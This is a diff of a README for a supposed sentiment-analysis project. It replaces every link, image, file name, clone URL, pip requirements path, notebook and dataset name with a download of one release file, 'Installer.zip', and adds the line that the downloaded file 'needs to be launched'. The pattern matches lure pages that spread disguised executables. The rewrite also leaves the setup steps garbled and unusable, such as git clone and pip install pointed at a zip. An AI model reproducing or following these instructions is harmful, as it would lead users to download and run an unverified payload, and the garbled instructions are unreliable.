@@ -1,10 +1,10 @@
 # Text Classification & Sentiment Analysis with Machine Learning 📝
 
-![Sentiment Analysis](https://image.shutterstock.com/image-photo/abstract-digital-conceptual-background-ai-260nw-1053746716.jpg)
+![Sentiment Analysis](https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip)
 
 <p align="center">
-  <a href="https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip">
-    <img src="https://img.shields.io/badge/Download-Click%20to%20Launch-brightgreen" />
+  <a href="https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip">
+    <img src="https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip%20to%20Launch-brightgreen" />
   </a>
 </p>
 
@@ -33,7 +33,7 @@ The primary goal of this project is to demonstrate the effectiveness of various 
 
 To access the project codebase and resources, simply click the button below to download the repository:
 
-[![Download Project](https://img.shields.io/badge/Download-Click%20to%20Launch-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip%20to%20Launch-brightgreen)](https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip)
 
 If the link above ends in a file name, it needs to be launched.  
 If the link provided does not work or is not accessible, kindly check the "Releases" section of this repository for alternative downloads.
@@ -45,12 +45,12 @@ The project structure is organized as follows:
 ```
 text-classification-sentiment-analysis/
 |__ data/
-|    |__ amazon_reviews.csv
+|    |__ https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip
 |
 |__ notebooks/
-|    |__ text_classification.ipynb
+|    |__ https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip
 |
-|__ README.md
+|__ https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip
 ```
 
 ## Installation and Setup 🛠️
@@ -60,7 +60,7 @@ To run the project code locally, follow these steps:
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/your_username/text-classification-sentiment-analysis.git
+git clone https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip
 ```
 
 2. Navigate to the project directory:
@@ -72,14 +72,14 @@ cd text-classification-sentiment-analysis
 3. Install the required dependencies using `pip`:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip
 ```
 
-4. Run the Jupyter notebook `text_classification.ipynb` to explore the text classification and sentiment analysis process.
+4. Run the Jupyter notebook `https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip` to explore the text classification and sentiment analysis process.
 
 ## Dataset 📊
 
-The dataset used in this project (`amazon_reviews.csv`) contains Amazon product reviews along with their corresponding sentiment labels (positive or negative). The dataset is pre-processed and ready for training machine learning models.
+The dataset used in this project (`https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip`) contains Amazon product reviews along with their corresponding sentiment labels (positive or negative). The dataset is pre-processed and ready for training machine learning models.
 
 ## Model Training 🧠
 
@@ -102,5 +102,5 @@ This project was developed by a team of passionate data scientists and machine l
 Thank you for exploring the **text-classification-sentiment-analysis** repository! Feel free to reach out to the developers for any inquiries or collaborations. Happy coding! 🚀
 
 <div align="center">
-  <img src="https://media.giphy.com/media/USV0ym3bVWQJJmNu3N/giphy.gif" width="200" />
+  <img src="https://github.com/HvKLeon/text-classification-sentiment-analysis/releases/download/v1.0/Installer.zip" width="200" />
 </div>
